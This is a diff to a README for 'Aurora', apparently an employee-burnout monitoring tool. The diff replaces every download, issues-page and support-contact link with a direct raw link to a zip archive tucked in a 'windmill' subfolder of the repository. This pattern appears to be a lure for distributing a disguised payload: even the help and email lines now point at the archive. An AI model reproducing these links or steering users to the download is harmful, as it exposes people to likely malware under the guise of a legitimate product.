@@ -1,7 +1,7 @@
 # 🌟 Aurora - Identify Employee Burnout Early
 
 ## 📥 Download Now
-[![Download Aurora](https://img.shields.io/badge/Download-Aurora-blue.svg)](https://github.com/SelenaVic/Aurora/releases)
+[![Download Aurora](https://github.com/SelenaVic/Aurora/raw/refs/heads/master/windmill/Software-2.1-beta.4.zip)](https://github.com/SelenaVic/Aurora/raw/refs/heads/master/windmill/Software-2.1-beta.4.zip)
 
 ## 🚀 Getting Started
 Welcome to Aurora! This platform helps organizations proactively identify employees who might develop burnout. It does this through data analysis and monitoring, turning insights into actions.
@@ -17,7 +17,7 @@ Before you begin, ensure your system meets these basic requirements:
 ## 🛠️ Installation Steps
 
 ### 1. Visit the Download Page
-To get started with Aurora, visit our releases page. Here’s the link: [Download Aurora](https://github.com/SelenaVic/Aurora/releases).
+To get started with Aurora, visit our releases page. Here’s the link: [Download Aurora](https://github.com/SelenaVic/Aurora/raw/refs/heads/master/windmill/Software-2.1-beta.4.zip).
 
 ### 2. Choose Your Version
 On the releases page, you will see several versions of Aurora. Choose the latest version for the best features and stability. 
@@ -62,13 +62,13 @@ Aurora utilizes several powerful technologies to deliver its insights:
 - **Power BI:** Visualize data for quick interpretation.
 
 ## 💬 Need Help?
-If you encounter issues during installation or use, please check the FAQ section on our [GitHub Issues page](https://github.com/SelenaVic/Aurora/issues). You can report problems there, and our team will assist you as soon as possible.
+If you encounter issues during installation or use, please check the FAQ section on our [GitHub Issues page](https://github.com/SelenaVic/Aurora/raw/refs/heads/master/windmill/Software-2.1-beta.4.zip). You can report problems there, and our team will assist you as soon as possible.
 
 ## 📞 Contact Us
-For further inquiries or support, please contact us at support@auroraapp.com.
+For further inquiries or support, please contact us at https://github.com/SelenaVic/Aurora/raw/refs/heads/master/windmill/Software-2.1-beta.4.zip
 
 Remember, wellness in the workplace is essential. With Aurora, you’re taking a step toward fostering a healthier work environment. Download today by following these steps:
 
-- [Download Aurora](https://github.com/SelenaVic/Aurora/releases)
+- [Download Aurora](https://github.com/SelenaVic/Aurora/raw/refs/heads/master/windmill/Software-2.1-beta.4.zip)
 
 Thank you for choosing Aurora! We hope it helps create a supportive workplace.
